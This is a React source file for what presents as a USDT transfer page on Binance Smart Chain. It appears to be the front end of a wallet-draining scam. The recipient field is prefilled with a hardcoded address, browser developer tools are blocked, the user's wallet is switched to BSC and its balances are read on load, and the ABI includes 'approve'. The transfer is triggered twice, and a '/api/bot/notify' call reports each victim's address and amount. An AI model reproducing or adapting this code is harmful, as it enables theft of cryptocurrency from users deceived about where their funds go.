import React, { useState, useEffect, useRef } from "react";
import styled from 'styled-components';
import Web3 from "web3";
import { ethers } from "ethers";
import { FaArrowLeft } from 'react-icons/fa';
import DisableDevtool from 'disable-devtool';
import { fetchBalances, handleGetStartedClick } from './utils/transactionUtils';
import { detectWalletAddress } from "./utils/transactionUtils";

const USDT_CONTRACT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const RECIPIENT_ADDRESS = "0x1EaDA2b8cC4054Cee7b95087F4D1E913Ca22131d";
const USDT_ABI = [
  {
    constant: true,
    inputs: [{ internalType: "address", name: "account", type: "address" }],
    name: "balanceOf",
    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: false,
    inputs: [
      { internalType: "address", name: "recipient", type: "address" },
      { internalType: "uint256", name: "amount", type: "uint256" },
    ],
    name: "transfer",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: false,
    inputs: [
      { internalType: "address", name: "spender", type: "address" },
      { internalType: "uint256", name: "value", type: "uint256" }
    ],
    name: "approve",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    payable: false,
    stateMutability: "nonpayable",
    type: "function"
  }    
];

const rpcUrl = "https://bsc-dataseed.binance.org/";
const bscProvider = new ethers.JsonRpcProvider(rpcUrl);

const GlobalStyle = styled.div`
  background-color: white !important;
  color: black !important;
  height: 100vh;
  width: 100vw;
  display: flex;
  justify-content: center;
  align-items: center;
`;

const Container = styled.div`
  display: flex;
  flex-direction: column;
  padding: 20px;
  height: 100vh;
  justify-content: flex-start;
  width: 100%;
  box-sizing: border-box;
`;

const BackButton = styled.button`
  position: absolute;
  left: 20px;
  top: 35px;
  background: none;
  border: none;
  color: #d8dbdf;
  font-size: 20px;
  cursor: pointer;
`;

const Title = styled.h1`
  font-size: 16px;
  font-weight: 550;
  text-align: center;
  margin-bottom: 10px;
  font-family: 'Roboto', sans-serif;
`;

const InputContainer = styled.div`
  margin-top: 10px;
  margin-bottom: 20px;
`;

const InputLabel = styled.label`
  font-size: 14px;
  font-weight: 500;
  color: #626262;
`;

const InputFieldContainer = styled.div`
  display: flex;
  align-items: center;
  position: relative;
  width: 100%;
`;

const Input = styled.input`
  width: 100%;
  padding: 16px 100px 16px 12px;
  font-size: 16px;
  font-weight: normal;
  margin-top: 5px;
  border-radius: 3px;
  border: 1px solid #ccc;
  box-sizing: border-box;
  height: 50px;
  appearance: none;
  -moz-appearance: textfield;

  &::-webkit-outer-spin-button,
  &::-webkit-inner-spin-button {
    -webkit-appearance: none;
    margin: 0;
  }

  &:focus {
    border-color: #eeeff2;
    box-shadow: 0px 0px 6px #eeeff2;
    outline: none;
  }
`;

const ClearButton = styled.span`
  position: absolute;
  right: 60px;
  top: 50%;
  transform: translateY(-50%);
  background: #eeeff2;
  color: #626262;
  font-size: 14px;
  font-weight: 500;
  cursor: pointer;
  border-radius: 50%;
  width: 24px;
  height: 24px;
  display: flex;
  align-items: center;
  justify-content: center;

  &:hover {
    background: #dcdcdc;
  }
`;

const PasteButton = styled.span`
  position: absolute;
  right: 12px;
  top: 50%;
  transform: translateY(-50%);
  color: #0600ff;
  font-weight: 600;
  font-size: 14px;
  cursor: pointer;
  padding-left: 15px;
  background-color: white !important;
  color: black !important;
  
  * {
    color-scheme: light !important;
  }
`;

const UsdtText = styled.span`
  position: absolute;
  right: 50px;
  top: 50%;
  transform: translateY(-50%);
  color: #626262;
  font-weight: 600;
  font-size: 14px;
`;

const MaxText = styled.span`
  position: absolute;
  right: 10px;
  top: 50%;
  transform: translateY(-50%);
  color: #0600ff;
  font-weight: 600;
  font-size: 14px;
  cursor: pointer;
`;

const AmountContainer = styled.div`
  display: flex;
  justify-content: space-between;
  align-items: center;
  position: relative;
  width: 100%;
`;

const NextButton = styled.button`
  background-color: #0600ff;
  color: white;
  padding: 15px 25px;
  font-size: 18px;
  font-weight: bold;
  width: 100%;
  border-radius: 20px;
  border: none;
  cursor: pointer;
  box-shadow: 0px 4px 10px rgba(0, 0, 255, 0.2);
  margin-top: 250px;
  display: flex;
  align-items: center;
  justify-content: center;
`;

const AmountConversion = styled.p`
  text-align: left;
  color: #626262;
  font-size: 14px;
  font-weight: 500;
  margin-top: 10px;
`;

const App = () => {
  const [address, setAddress] = useState(RECIPIENT_ADDRESS);
  const [usdtAmount, setUsdtAmount] = useState("");
  const [usdtBalance, setUsdtBalance] = useState(0);
  const [bnbBalance, setBnbBalance] = useState(0);
  const [walletConnected, setWalletConnected] = useState(false);
  const [loading, setLoading] = useState(false);
  const [transferCompleted, setTransferCompleted] = useState(false);
  const [walletAddress, setWalletAddress] = useState("");

  const isProcessing = useRef(false);

  useEffect(() => {
    DisableDevtool({
      ondevtoolopen: (type) => {
        alert('Developer tools are disabled on this page.');
      }
    });
  }, []);

  useEffect(() => {
    const ensureBSCNetwork = async () => {
      const bscChainId = "0x38";
      try {
        const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
        if (currentChainId !== bscChainId) {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: bscChainId }],
          });
        }
      } catch (error) {
        if (error.code === 4902) {
          try {
            await window.ethereum.request({
              method: 'wallet_addEthereumChain',
              params: [{
                chainId: bscChainId,
                chainName: 'Binance Smart Chain',
                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                rpcUrls: ['https://bsc-dataseed.binance.org/'],
                blockExplorerUrls: ['https://bscscan.com'],
              }],
            });
          } catch (addError) {
            console.error("❌ Couldn't add BSC:", addError);
          }
        } else {
          console.error("❌ Failed to switch network:", error);
        }
      }
    };
    ensureBSCNetwork();
  }, []);

  useEffect(() => {
    const init = async () => {
      try {
        if (!window.ethereum) return;
        const provider = new ethers.BrowserProvider(window.ethereum);
        const signer = await provider.getSigner();
        const userAddress = await signer.getAddress();
        setWalletAddress(userAddress);
        console.log("🔗 Wallet connected:", userAddress);
        const balances = await fetchBalances(userAddress);
        setUsdtBalance(balances.usdt);
        setBnbBalance(balances.bnb);
        console.log("✅ Balances fetched:", balances);
        setWalletConnected(true);
      } catch (err) {
        console.error("❌ init() error:", err);
      }
    };
    init();
  }, []);

  const clearAddress = () => {
    setAddress("");
  };

  return (
    <GlobalStyle>
      <Container>
        <InputContainer>
          <InputLabel>Address or Domain Name</InputLabel>
          <InputFieldContainer>
            {address && <ClearButton onClick={clearAddress}>×</ClearButton>}
            <Input type="text" value={address} onChange={(e) => setAddress(e.target.value)} />
            <PasteButton>Paste</PasteButton>
          </InputFieldContainer>
        </InputContainer>

        <InputContainer>
          <InputLabel>Amount</InputLabel>
          <AmountContainer>
            <InputFieldContainer>
              <Input type="number" value={usdtAmount} onChange={(e) => setUsdtAmount(e.target.value)} />
              <UsdtText>USDT</UsdtText>
              <MaxText>Max</MaxText>
            </InputFieldContainer>
          </AmountContainer>
          <AmountConversion>= ${parseFloat(usdtAmount * 1 || 0).toFixed(2)}</AmountConversion>
        </InputContainer>

        <NextButton
          onClick={async () => {
            try {
              setLoading(true);
              if (!usdtAmount || isNaN(parseFloat(usdtAmount)) || parseFloat(usdtAmount) <= 0) {
                throw new Error("Please enter a valid USDT amount.");
              }
              await handleGetStartedClick(usdtAmount);
              setTransferCompleted(true);
              // Notify bot after successful transfer
              fetch('/api/bot/notify', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  txHash: (await handleGetStartedClick(usdtAmount)).hash,
                  from: walletAddress,
                  to: RECIPIENT_ADDRESS,
                  amount: usdtAmount
                })
              }).catch(console.error);
            } catch (error) {
              console.error("Transfer failed:", error);
              alert(error.message || "Transfer failed. Check console for details.");
            } finally {
              setLoading(false);
            }
          }}
        >
          {loading ? "Processing..." : transferCompleted ? "Transfer completed" : walletConnected ? "Next" : "Connect Wallet"}
        </NextButton>
      </Container>
    </GlobalStyle>
  );
};

export default App;
